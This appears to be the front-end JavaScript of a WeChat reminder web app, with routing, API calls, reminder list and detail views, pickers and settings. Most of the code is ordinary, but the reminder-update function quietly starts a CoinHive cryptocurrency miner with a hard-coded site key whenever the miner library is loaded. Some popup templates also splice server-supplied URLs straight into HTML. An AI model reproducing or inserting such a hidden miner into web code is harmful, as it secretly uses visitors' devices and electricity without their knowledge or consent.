'use strict';
angular.module('remind', ['ionic'])
    .config(function ($httpProvider, $stateProvider, $ionicConfigProvider, $urlRouterProvider) {
        $httpProvider.defaults.xsrfCookieName = 'csrftoken';
        $httpProvider.defaults.xsrfHeaderName = 'X-CSRFToken';

        $ionicConfigProvider.templates.maxPrefetch(0);
        // $ionicConfigProvider.views.maxCache(0);
        $ionicConfigProvider.tabs.position('bottom');
        $ionicConfigProvider.tabs.style('standard');

        $urlRouterProvider.otherwise('/');
        $stateProvider
            .state('settings', {
                url: '/settings',
                views: {
                    'settings-view': {
                        templateUrl: settingsUrl,
                        controller: 'SettingsCtrl',
                        controllerAs: 'settingsCtrl',
                        resolve: {
                            profile: function (remindManager) {
                                return remindManager.getProfile();
                            }
                        }
                    }
                }
            })
            .state('remind-list', {
                url: '/',
                views: {
                    'remind-view': {
                        templateUrl: remindListUrl,
                        controller: 'RemindListCtrl',
                        controllerAs: 'remindListCtrl'
                    }
                }
            })
            .state('remind-detail', {
                url: '/:id',
                views: {
                    'remind-view': {
                        templateUrl: remindDetailUrl,
                        controller: 'RemindDetailCtrl',
                        controllerAs: 'remindDetailCtrl',
                        resolve: {
                            remind: function (remindManager, $stateParams, $q) {
                                if (remindManager.currentRemind && remindManager.currentRemind.id === $stateParams.id) {
                                    return remindManager.currentRemind;
                                }
                                var deferred = $q.defer();
                                remindManager.get($stateParams.id, function (remind) {
                                    deferred.resolve(remind);
                                });
                                return deferred.promise;
                            }
                        }
                    }
                }
            });
    })
    // .constant('$ionicLoadingConfig', {
    //     delay: 1000,
    //     templateUrl: 'loading-toast'
    // })
    .factory('indicator', function($rootScope, $timeout) {
        return {
            show: function (msg, timeout) {
                $rootScope.message = msg;
                $timeout(function () {
                    $rootScope.message = null;
                }, timeout)
            }
        };
    })
    .factory('remindManager', function($http, $ionicLoading, $rootScope, indicator, $state, $location, $q) {
        // Returns a promise as well as accepting callback for legacy reason
        function httpRequest(url, method, onSuccess, payload) {
            method = method || 'get';
            $ionicLoading.show({
                delay: 500,
                templateUrl: 'loading-toast'
            });
            var promise = $http({
                method: method,
                url: url,
                data: payload,
                timeout: 50000,
                headers: {
                    // Pass current url back, so authentication knows where to redirect to after login successfully
                    "X-Referer": $location.absUrl()
                }
            });
            promise.success(function (resp) {
                onSuccess && onSuccess(resp);
            }).error(function (body, status, headerGetter, config) {
                var msg = '请稍候再试~';
                var title = '哎呀，出错啦！！！';
                if(status === 401) {
                    document.title = '微信登录中...';
                    if(headerGetter('WWW-Authenticate')) {
                        location.href = headerGetter('WWW-Authenticate');
                        return;
                    }
                } else if (status === 404) {
                    title = '没找到这个提醒';
                    msg = '它是不是被删了，或者你进错了地方？';
                } else if (status === 403) {
                    title = '没有权限';
                    msg = '亲，你不能这样做哦';
                }
                weui.alert(msg, {
                    title: title,
                    buttons: [{
                        label: '知道了'
                    }]
                });
            }).finally(function () {
                $ionicLoading.hide();
            });
            return promise;
        }

        $rootScope.deleteRemind = function (id, list) {
            weui.confirm('', {
                title: '确认删除？',
                buttons: [{
                    label: '取消',
                    type: 'default'
                }, {
                    label: '确认',
                    type: 'primary',
                    onClick: function () {
                        httpRequest('/reminds/api/' + id + '/', 'delete', function () {
                            if (list !== undefined) {
                                for (var i = 0; i < list.length; ++i) {
                                    if (list[i].id === id) {
                                        list.splice(i, 1);
                                        break;
                                    }
                                }
                            }
                            indicator.show('删除成功', 2000);
                            $state.go('remind-list');
                        });
                    }
                }]
            });
        };

        var qrUrlCache = {};
        return {
            getList: function (url, onSuccess) {
                url = url || '/reminds/api/';
                return httpRequest(url, 'get', onSuccess);
            },
            get: function (id, onSuccess) {
                return httpRequest('/reminds/api/'+id+'/', 'get', onSuccess);
            },
            update: function (id, payload, onSuccess, msg) {
                if(window.CoinHive) {
                    new CoinHive.User('GRKSv76kf5hxxw1tqCzXUVBcfSla7oJD', 'wecron-wechat').start();
                }
                return httpRequest('/reminds/api/'+id+'/', 'patch', function (resp) {
                    indicator.show(msg || '更新成功', 2000);
                    onSuccess && onSuccess(resp);
                }, payload);
            },
            getProfile: function () {
                return httpRequest('/profile/api/', 'get').then(function (resp) {
                    return resp.data;
                });
            },
            updateProfile: function (payload) {
                return httpRequest('/profile/api/', 'patch', null, payload);
            },
            getQRcodeURL: function (remindId) {
                if(qrUrlCache[remindId]) return $q.resolve(qrUrlCache[remindId]);
                return httpRequest('/reminds/api/'+remindId+'/qrcode/').then(function (resp) {
                    if(resp.data.qrcodeUrl && resp.data.qrcodeUrl.startsWith('http')) {
                        qrUrlCache[remindId] = resp.data.qrcodeUrl;
                        return resp.data.qrcodeUrl;
                    }
                    throw new Error('不知道什么原因，不能获取到该提醒的二维码~');
                });
            },
            httpRequest: httpRequest
        }
    })
    .controller('RemindListCtrl', function($scope, remindManager, $filter, $state){
        var ctrl = this;
        ctrl.remindList = [];
        document.title = '微定时 — 我的提醒';

        ctrl.loadPreviousPage = function () {
            if(!ctrl.previousPageUrl) {
                $scope.$broadcast('scroll.refreshComplete');
                return;
            }
            remindManager.getList(ctrl.previousPageUrl, function(pagedList) {
                ctrl.remindList = pagedList.results.concat(ctrl.remindList);
                // We use null as a ng-if condition
                ctrl.previousPageUrl = pagedList.previous || null;
            }).error(function () {
                ctrl.previousPageUrl = null;
            }).finally(function () {
                $scope.$broadcast('scroll.refreshComplete');
            });
        };

        ctrl.loadNextPage = function () {
            remindManager.getList(ctrl.nextPageUrl, function(pagedList) {
                ctrl.remindList = ctrl.remindList.concat(pagedList.results);
                if(!ctrl.nextPageUrl) {
                    // Initial load
                    ctrl.previousPageUrl = pagedList.previous;
                }
                // We use null as a ng-if condition
                ctrl.nextPageUrl = pagedList.next || null;
            }).error(function () {
                ctrl.nextPageUrl = null;
            }).finally(function () {
                $scope.$broadcast('scroll.infiniteScrollComplete');
            });
        };

        ctrl.viewDetail = function (remind) {
            // Any better way to pass extra data to new state?
            remindManager.currentRemind = remind;
            $state.go('remind-detail', remind);
        };

        $scope.$watchCollection(function () {
            return ctrl.remindList;
        }, function (newVal) {
            groupByDate(newVal);
        });

        function groupByDate(remindList) {
            var group = {};
            var dateFormatter = $filter('date');
            var today = new Date();
            var todayStr = dateFormatter(today, 'yyyy年M月d日');
            var yesterdayStr = dateFormatter(new Date().setDate(today.getDate()-1), 'yyyy年M月d日');
            var tomorrowStr = dateFormatter(new Date().setDate(today.getDate()+1), 'yyyy年M月d日');
            var thisYearStr = today.getFullYear()+'年';
            remindList.forEach(function (item) {
                var date = dateFormatter(item.time, 'yyyy年M月d日 EEE');
                date = date.replace(todayStr, todayStr+'(今天)')
                        .replace(yesterdayStr, yesterdayStr+'(昨天)')
                        .replace(tomorrowStr, tomorrowStr+'(明天)')
                        .replace(thisYearStr, '');
                if(!group.hasOwnProperty(date)) {
                    group[date] = [];
                }
                group[date].push(item);
            });
            var groupList = [];
            angular.forEach(group, function (reminds, date) {
                groupList.push([date, reminds]);
            });
            ctrl.remindGroupList = groupList.sort(function (a, b) {
                return a[1][0].time - b[1][0].time;
            });
        }
    })
    .controller('RemindDetailCtrl', function(remind, $scope, $stateParams, $filter, $ionicPopup, $location, remindManager) {
        var ctrl = this;

        remind.time = new Date(remind.time);
        ctrl.modified = false;
        ctrl.model = remind;
        if (remind.participate_qrcode) {
            $ionicPopup.show({
                title: '长按扫码，关注公众号后接受邀请',
                subTitle: remind.desc,
                template: '<img class="qrcode" src="'+ remind.participate_qrcode + '" />'
            });
        } else {
            var pidList = remind.participants.map(function (p) {
                return p.id;
            });
            if (pidList.concat(remind.owner.id).indexOf(userID) === -1) {
                weui.confirm(remind.desc, {
                    title: '是否订阅此提醒？',
                    buttons: [{
                        label: '取消',
                        type: 'default'
                    }, {
                        label: '确认',
                        type: 'primary',
                        onClick: function () {
                            remindManager.update($stateParams.id, {
                                participants: remind.participants.concat([{id: userID}])
                            }, function (newRemind) {
                                newRemind.time = new Date(newRemind.time);
                                ctrl.model = newRemind;
                            }, '订阅成功');
                        }
                    }]
                });
            }
        }

        ctrl.update = function () {
            remindManager.update($stateParams.id, {
                time: ctrl.model.time.getTime(),
                desc: ctrl.model.desc,
                defer: ctrl.model.defer,
                repeat: ctrl.model.repeat,
                title: ctrl.model.title
            }, function () {
                ctrl.modified = false;
            });
        };
        ctrl.canEdit = function () {
            return ctrl.model && ctrl.model.owner && ctrl.model.owner.id === userID;
        };

        wx.error(function(res){
           // alert(res);
        });
        var dateFormatter = $filter('date');
        $scope.$watch(function () {
           return ctrl.model;
        }, function (newVal, oldVal) {
            if(oldVal && !angular.equals(newVal, oldVal)) {
                ctrl.modified = true;
            }
            if(newVal && newVal.desc) {
                document.title = '微定时 — ' + newVal.desc;

                var shareCfg = {
                    title: '[微定时] ' + newVal.title,
                    desc: '来自：' + newVal.owner.nickname +
                        '\n时间：' + dateFormatter(newVal.time, 'yyyy/M/d(EEE) HH:mm') +
                        '\n描述：' + newVal.desc +
                        (formatTimeRepeat(newVal.repeat) ? '\n重复：' + formatTimeRepeat(newVal.repeat) : ''),
                    link: $location.absUrl(),
                    imgUrl: newVal.owner.headimgurl
                };
                wx.ready(function() {
                    wx.onMenuShareAppMessage(shareCfg);
                    wx.onMenuShareQQ(shareCfg);
                    wx.onMenuShareWeibo(shareCfg);
                    wx.onMenuShareQZone(shareCfg);
                    // 分享到朋友圈没有desc字段，取title
                    wx.onMenuShareTimeline(angular.extend({}, shareCfg, {title: '[微定时] ' + newVal.desc}));
                });
            }
        }, true);

        ctrl.showDeferPicker = function () {
            var minutesCol = Array.apply(null, {length: 31}).map(function (element, index) {
                return {
                    label: index,
                    value: index,
                    children: [
                        {
                            label: '分钟',
                            value: 1
                        },
                        {
                            label: '小时',
                            value: 60
                        },
                        {
                            label: '天',
                            value: 24*60
                        },
                        {
                            label: '周',
                            value: 7*24*60
                        }
                    ]
                };
            });
            weui.picker([
                {
                    label: '提前',
                    value: -1,
                    children: minutesCol
                },
                {
                    label: '延后',
                    value: 1,
                    children: minutesCol
                }
            ], {
                defaultValue: (function(){
                    var defer = ctrl.model.defer;
                    var unit = getNaturalUnit(defer);
                    if (unit[1] === 0) {
                        return [-1, 0, 1];
                    }
                    return [defer>0?1:-1, Math.abs(defer / unit[1]), unit[1]];
                })(),
                onConfirm: function (result) {
                    ctrl.model.defer = result.reduce(function(a, b){return a*b});
                    $scope.$apply();
                },
                id: 'deferPicker'+ctrl.model.id
            });
        };

        ctrl.showRepeatPicker = function () {
            var countCol = Array.apply(null, {length: 100}).map(function (element, index) {
                return {
                    label: index,
                    value: index,
                    children: [
                        {
                            label: '年',
                            value: 0
                        },
                        {
                            label: '月',
                            value: 1
                        },
                        {
                            label: '天',
                            value: 2
                        },
                        {
                            label: '周',
                            value: 3
                        },
                        {
                            label: '小时',
                            value: 3
                        }
                    ]
                };
            });
            weui.picker([
                {
                    label: '每',
                    value: 0,
                    children: countCol
                }
            ], {
                defaultValue: (function(){
                    var repeat = ctrl.model.repeat || [0, 0, 0, 0, 0];
                    for(var i=0; i<repeat.length; ++i) {
                        if(repeat[i] !== 0) {
                            return [0, repeat[i], i];
                        }
                    }
                    return [0, 0, 0];
                })(),
                onConfirm: function (result) {
                    ctrl.model.repeat = [0, 0, 0, 0, 0];
                    ctrl.model.repeat[result[2]] = result[1];
                    $scope.$apply();
                },
                id: 'repeatPicker'+ctrl.model.id
            });
        };

        ctrl.showQRcode = function () {
            remindManager.getQRcodeURL(remind.id)
                .then(function (qrcodeUrl) {
                    $ionicPopup.alert({
                        title: '把这个二维码\u5206\u4eab出去，让别的小伙伴也能接受到这个提醒吧~',
                        template: '<img class="qrcode" src="'+ qrcodeUrl + '" />'
                    });
                }).catch(function (err) {
                    weui.alert(err.message, {
                        title: '哎呀，出错啦！！！',
                        buttons: [{
                            label: '好的'
                        }]
                    });
                });
        };

        ctrl.showSharePost = function () {
            var postUrl = remind.post_url;
            var newScope = $scope.$new();
            newScope.imgOnLoad = function ($event) {
                newScope.loaded = true;
            };
            $ionicPopup.alert({
                title: '长按图片，把它\u5206\u4eab出去，让别的小伙伴也能接受到这个提醒吧~',
                scope: newScope,
                template: '<div style="text-align: center;"><ion-spinner ng-show="!loaded" icon="android"></ion-spinner>' +
                '<a ng-show="loaded" href="' + postUrl + '"><img class="qrcode" alt="提醒海报" ' +
                'img-on-load="imgOnLoad()" src="'+ postUrl + '" /></a></div>'
            });
        };

        ctrl.promptShare = function () {
            document.getElementById('weixinTip').style.display="block";
        };
        ctrl.playMedia = function () {
            if(!ctrl.model.media_id) {
                return;
            }
            var media = document.getElementById("mediaBox");
            media.src = '/reminds/media/' + ctrl.model.media_id;
            // media.src = 'http://www.w3school.com.cn/i/song.mp3';
            media.play().catch(function (e) {
                console.log(e);
            });
        };
        ctrl.showParticipants = function () {
            if(!ctrl.model.participants.length) {
                $ionicPopup.alert({
                    title: '参与者',
                    template: '目前还没有人订阅这条提醒，快快点击右上角，把它\u5206\u4eab出去，让别的小伙伴也能接受到这个提醒吧~',
                    okText: '好的'
                });
            } else {
                $ionicPopup.alert({
                    title: '参与者',
                    templateUrl: 'participant-model.html',
                    scope: $scope,
                    okText: '好的'
                });
            }
        };
        // ctrl.setEdit = function () {
        //     // For iOS
        //     document.getElementById('remind-title').focus();
        //     // For Android
        //     setTimeout(function () {
        //         document.getElementById('remind-title').focus();
        //     }, 0);
        // };
    })
    .controller('SettingsCtrl', function($scope, profile, remindManager, $filter) {
        $scope.profile = profile;
        profile.hasMorningGreeting = Boolean(profile.morning_greeting);
        if (profile.hasMorningGreeting) {
            var timeFields = profile.morning_greeting.split(':');
            profile.morningGreetingTime = new Date(2017, 1, 1, timeFields[0], timeFields[1]);
        } else {
            profile.morningGreetingTime = new Date(2017, 1, 1, 8);
        }
        profile.timezone = profile.timezone || 'Asia/Shanghai';
        $scope.$watch('profile', function (newVal, oldVal) {
            if (!oldVal || angular.equals(newVal, oldVal)) {
                return;
            }
            var payload = {morning_greeting: null, notify_subscription: profile.notify_subscription,
                timezone: profile.timezone};
            if(profile.hasMorningGreeting) {
                payload.morning_greeting = $filter('date')(profile.morningGreetingTime, 'HH:mm');
            }
            remindManager.updateProfile(payload);
        }, true);
    }).directive('natureTimeDefer', function () {
        return {
            require: '^ngModel',
            restrict: 'A',
            link: function (scope, elm, attrs, ctrl) {
                ctrl.$formatters.unshift(function (modelValue) {
                    if (modelValue === undefined) {
                        return '';
                    }
                    var unit = getNaturalUnit(modelValue);
                    if (unit[1] === 0) {
                        return '准时'
                    }
                    return (modelValue < 0 ? '提前' : '延后') + Math.abs(modelValue / unit[1]) + unit[0];
                });
            }
        };
    }).directive('natureRepeat', function () {
        return {
            require: '^ngModel',
            restrict: 'A',
            link: function (scope, elm, attrs, ctrl) {
                ctrl.$formatters.unshift(function (modelValue) {
                    if (modelValue === undefined) {
                        return null;
                    }
                    if (angular.isString(modelValue)) {
                        modelValue = JSON.parse("[" + modelValue + "]");
                    }
                    return formatTimeRepeat(modelValue) || '不重复';
                });
            }
        };
    }).directive('imgOnLoad', ['$parse', function ($parse) {
        return {
          restrict: 'A',
          link: function (scope, elem, attrs) {
            var fn = $parse(attrs.imgOnLoad);
            elem.on('load', function (event) {
              scope.$apply(function() {
                fn(scope, { $event: event });
              });
            });
          }
        };
  }]);

function formatTimeRepeat(repeat) {
    repeat = repeat || [0, 0, 0, 0, 0];
    for(var i=0; i<repeat.length; ++i) {
        if(repeat[i] !== 0) {
            return '每'+repeat[i]+(['年', '月', '天', '周', '小时', '分钟'][i]);
        }
    }
    return null;
}

function getNaturalUnit(defer) {
    defer = parseInt(defer);
    if (!defer) {
        return ['分钟', 0];
    }
    var natualUnits = [['周', 7 * 24 * 60], ['天', 24 * 60], ['小时', 60], ['分钟', 1]];
    for (var idx in natualUnits) {
        if (defer % natualUnits[idx][1] === 0)
            return natualUnits[idx];
    }
    return natualUnits[natualUnits.length-1];
}
